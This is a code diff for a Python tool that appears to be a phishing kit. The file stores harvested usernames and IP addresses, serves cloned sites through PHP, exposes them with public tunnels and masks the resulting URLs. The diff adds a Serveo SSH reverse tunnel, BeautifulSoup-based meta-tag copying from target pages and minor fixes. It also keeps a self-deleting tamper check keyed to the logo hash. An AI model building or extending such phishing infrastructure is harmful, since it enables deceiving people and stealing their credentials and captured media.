@@ -41,7 +41,6 @@ SOFTWARE.
 
 from argparse import ArgumentParser
 from importlib import import_module as eximport
-from glob import glob
 from hashlib import sha256
 from json import (
     dumps as stringify,
@@ -56,9 +55,6 @@ from os import (
     mknod,
     popen,
     remove,
-    rename,
-    replace,
-    system
 )
 from os.path import (
     abspath,
@@ -71,43 +67,27 @@ from os.path import (
 from platform import uname
 from re import search, sub
 from shutil import (
-    copy as cp,
     copy2,
-    copyfile,
-    copytree,
     get_terminal_size,
     rmtree,
 )
 from signal import (
     SIGINT,
-    SIGKILL,
-    SIGTERM
 )
 from subprocess import (
     DEVNULL,
     PIPE,
     Popen,
-    STDOUT,
-    call,
     run
 )
 from smtplib import SMTP_SSL as smtp
-from socket import (
-    AF_INET as inet,
-    SOCK_STREAM as stream,
-    setdefaulttimeout,
-    socket
-)
 from sys import (
-    argv,
     stdout,
     version_info
 )
 from tarfile import open as taropen
 from time import (
-    ctime,
     sleep,
-    time
 )
 from zipfile import ZipFile
 
@@ -129,7 +109,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.1.3"
+version="1.2.0"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -160,7 +140,7 @@ lx_help = f"""
 """
 
 packages = [ "git", "php", "ssh" ]
-modules = [ "requests", "rich" ]
+modules = [ "requests", "rich", "beautifulsoup4:bs4" ]
 tunnelers = [ "cloudflared", "loclx" ]
 processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
 extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]
@@ -177,8 +157,12 @@ if version_info[0] != supported_version:
     exit(0)
 
 for module in modules:
+    if ":" in module:
+        module, importer = module.split(":")
+    else:
+        importer = module
     try:
-        eximport(module)
+        eximport(importer)
     except ImportError:
         try:
             print(f"Installing {module}")
@@ -190,8 +174,12 @@ for module in modules:
         exit(1)
 
 for module in modules:
+    if ":" in module:
+        module, importer = module.split(":")
+    else:
+        importer = module
     try:
-        eximport(module)
+        eximport(importer)
     except:
         print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
         exit(1)
@@ -200,7 +188,8 @@ from requests import (
     get,
     head, 
     Session
-) 
+)
+from bs4 import BeautifulSoup
 from requests.exceptions import ConnectionError
 from rich.console import Console
 from rich.panel import Panel
@@ -235,6 +224,7 @@ php_file = f"{tunneler_dir}/php.log"
 cf_file = f"{tunneler_dir}/cf.log"
 lx_file = f"{tunneler_dir}/loclx.log"
 lhr_file = f"{tunneler_dir}/lhr.log"
+svo_file = f"{tunneler_dir}/svo.log"
 site_dir = f"{home}/.site"
 cred_file = f"{site_dir}/usernames.txt"
 ip_file = f"{site_dir}/ip.txt"
@@ -348,11 +338,11 @@ def is_running(process):
 
 # Check if a json is valid
 def is_json(myjson):
-  try:
-    parse(myjson)
-    return True
-  except:
-    return False
+    try:
+        parse(myjson)
+        return True
+    except:
+        return False
 
 
 # A simple copy function
@@ -482,7 +472,7 @@ def text2json(text):
         if ":" in line:
             key = line.split(":")[0]
             value = line.split(":")[1]
-            for i in line:
+            for _ in line:
                 json[key.strip()] = value.strip()
     return json
 
@@ -541,9 +531,10 @@ def get_meta(url):
     allmeta = ""
     try:
         response = get(url, headers=headers).text
-        for line in response.split("\n"):
-            if line.strip().startswith("<meta "):
-                allmeta += line + "\n"
+        soup = BeautifulSoup(response, "html.parser")
+        metas = soup.find_all("meta")
+        if metas is not None and metas!=[]:
+            allmeta = "\n".join([str(meta) for meta in metas])
     except Exception as e:
         append(e, error_file)
     return allmeta
@@ -568,7 +559,7 @@ def exception_handler(e):
     lines_no = ", ".join(lines_arr)
     print(f"{error}{name}: {message} at lines {lines_no}")
     
-if sha256(logo.encode("utf-8")).hexdigest() != "d32253dd88b2225241185c161e4919c04f5ed52dd9291312234fb2052479116a":
+if sha256(logo.encode("utf-8")).hexdigest() != "101490b6a745ce1aa56c41f477b54fac5f3fddda798105e1a6090fb8eb52fdfb":
     print(f"{info}Visit: {repo_url}")
     bgtask(f"xdg-open {repo_url}")
     delete(__file__)
@@ -729,7 +720,6 @@ def download(url, path):
                 if total_length is None: # no content length header
                     file.write(response.content)
                 else:
-                    downloaded = 0
                     total_length = int(total_length)
                     with Progress(
                         TextColumn("[bold blue]{task.fields[filename]}", justify="right"),
@@ -781,7 +771,7 @@ def extract(filename, extract_path='.'):
                 extract(item.name, "./" + item.name[:item.name.rfind('/')])
     except Exception as e:
         append(e, error_file)
-        delete(file)
+        delete(filename)
         print(f"{error}{str(e)}")
         exit(1)
         
@@ -1383,6 +1373,7 @@ def server():
     cf_log = open(cf_file, "w")
     lx_log = open(lx_file, "w")
     lhr_log = open(lhr_file, "w")
+    svo_log = open(svo_file, "w")
     internet()
     bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
     sleep(2)
@@ -1409,6 +1400,7 @@ def server():
         bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
     else:
         bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
+    bgtask(f"ssh -R 80:{local_url} serveo.net -T -n", stdout=svo_log, stderr=svo_log)
     sleep(10)
     cf_success = False
     for i in range(10):
@@ -1424,17 +1416,23 @@ def server():
             lx_success = True
             break
         sleep(1)
-    lhr_success = False
+    svo_success = False
     for i in range(10):
         lhr_url = grep("(https://[-0-9a-z.]*.lhr.(life|pro))", lhr_file)
         if lhr_url != "":
             lhr_success = True
             break
         sleep(1)
-    if cf_success or lx_success or lhr_success:
+    for i in range(10):
+        svo_url = grep("(https://[-0-9a-z.]*.serveo.net)", svo_file)
+        if svo_url != "":
+            svo_success = True
+            break
+        sleep(1)
+    if cf_success or lx_success or lhr_success or svo_success:
         if mode == "test":
             print(f"\n{info}URL generation has completed successfully!")
-            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
+            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Serveo: {svo_success}")
             pexit()
         sprint(f"\n{info}Your urls are given below : \n")
         if cf_success:
@@ -1443,12 +1441,16 @@ def server():
             url_manager(lx_url, "LocalXpose")
         if lhr_success:
             url_manager(lhr_url, "LocalHostRun")
+        if svo_success:
+            url_manager(svo_url, "Serveo")
         if lx_success and tunneler.lower() in [ "loclx", "lx" ]:
             masking(lx_url)
         elif lhr_success and tunneler.lower() in [ "localhostrun", "lhr" ]:
             masking(lhr_url)
         elif cf_success and tunneler.lower() in [ "cloudflared", "cf" ]:
             masking(cf_url)
+        elif svo_success and tunneler.lower() in [ "serveo", "svo" ]:
+            masking(svo_url)
         else:
             print(f"\n{error}URL masking not available for {tunneler}!{nc}")
     else:
@@ -1513,7 +1515,7 @@ def waiter():
                     remove(file)
                     print(f"\n{info2}{green}{basename(file)} {cyan}saved in {green}{directory}")
                 print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
-                if get_media()==[]:
+                if not get_media():
                     remove(log_file)
             sleep(0.75)
     except KeyboardInterrupt:
